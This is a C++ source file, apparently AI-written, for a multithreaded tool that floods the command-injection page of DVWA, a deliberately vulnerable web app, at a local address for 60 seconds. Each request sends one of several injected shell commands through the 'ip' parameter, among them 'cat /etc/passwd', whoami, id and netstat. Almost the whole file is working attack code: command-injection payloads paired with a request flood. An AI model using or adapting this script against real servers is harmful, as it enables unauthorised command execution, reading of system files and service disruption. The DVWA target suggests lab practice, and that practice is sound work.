/*
 * DVWA Command Injection Flood Tool (Multi-threaded)
 * Author: Gemini
 * Dependency: libcurl
 * Compile: g++ cmd_injection_flood.cpp -o cmd_injection_flood -lcurl -lpthread
 */

#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <curl/curl.h>

// === 配置区域 ===
// 【修改点1】目标 URL 变为 exec (Command Injection 模块)
const std::string TARGET_BASE_URL = "http://192.168.0.114/dvwa/vulnerabilities/exec/";

// 【修改点2】请填入您的 PHPSESSID
const std::string SESSION_ID = "vn1234567890abcdef123456"; 
const std::string SECURITY_LEVEL = "low";

const int THREAD_COUNT = 10;
const int ATTACK_DURATION = 60; // 攻击 60 秒

// === 全局控制 ===
std::atomic<bool> is_running(true);
std::atomic<long> total_requests(0);

// 【修改点3】Command Injection Payloads
// 原理：利用 ; | && 等符号拼接恶意命令
const std::vector<std::string> PAYLOADS = {
    "127.0.0.1; whoami",
    "127.0.0.1 && ls -la",
    "127.0.0.1 | cat /etc/passwd",
    "127.0.0.1; pwd",
    "8.8.8.8; netstat -an",
    "127.0.0.1 | id",
    "; ls", // 直接执行不带 IP
    "127.0.0.1; sleep 1" // 延时测试
};

size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp) {
    return size * nmemb;
}

void attack_worker(int thread_id) {
    CURL *curl = curl_easy_init();
    if (!curl) return;

    std::string cookie_str = "security=" + SECURITY_LEVEL + "; PHPSESSID=" + SESSION_ID;
    
    curl_easy_setopt(curl, CURLOPT_COOKIE, cookie_str.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "CPP-CmdInject-Flooder/1.0");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);

    CURLcode res;
    
    while (is_running) {
        for (const auto& payload : PAYLOADS) {
            if (!is_running) break;

            // URL 编码 (关键：处理空格和特殊符号 ; | &)
            char *encoded_payload = curl_easy_escape(curl, payload.c_str(), payload.length());
            
            if (encoded_payload) {
                // 【修改点4】构造 URL
                // DVWA 命令注入的参数名通常是 'ip'，按钮是 'Submit'
                std::string full_url = TARGET_BASE_URL + "?ip=" + std::string(encoded_payload) + "&Submit=Submit";
                
                curl_easy_setopt(curl, CURLOPT_URL, full_url.c_str());
                res = curl_easy_perform(curl);

                if (res == CURLE_OK) {
                    total_requests++;
                }
                curl_free(encoded_payload);
            }
        }
    }
    curl_easy_cleanup(curl);
}

int main() {
    curl_global_init(CURL_GLOBAL_ALL);

    std::cout << "=== Command Injection Flood Started ===" << std::endl;
    std::cout << "Target: " << TARGET_BASE_URL << std::endl;
    std::cout << "Threads: " << THREAD_COUNT << std::endl;
    std::cout << "Duration: " << ATTACK_DURATION << "s" << std::endl;

    std::vector<std::thread> threads;
    for (int i = 0; i < THREAD_COUNT; ++i) {
        threads.emplace_back(attack_worker, i + 1);
    }

    std::this_thread::sleep_for(std::chrono::seconds(ATTACK_DURATION));
    is_running = false;

    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }

    std::cout << "\n=== Finished ===" << std::endl;
    std::cout << "Total Requests: " << total_requests.load() << std::endl;
    std::cout << "Avg RPS:        " << (total_requests.load() / ATTACK_DURATION) << std::endl;

    curl_global_cleanup();
    return 0;
}